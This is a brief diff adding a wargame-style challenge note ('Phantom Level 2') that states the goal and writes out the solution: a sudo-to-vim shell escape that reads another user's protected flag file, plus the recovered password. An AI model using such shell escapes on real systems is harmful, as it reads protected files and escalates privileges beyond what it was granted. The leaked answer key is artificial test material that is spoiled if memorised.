@@ -1,0 +1,6 @@
+[ Phantom · Level 2 ]  Sudo Games
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for phantom3
+
+sudo -u flagkeeper2 vim -Es +'!cat /var/lib/phantom-flags/level2_flag > /tmp/p3pass' +q; cat /tmp/p3pass: bl_phtm2_8aa5b04cdb337f6c
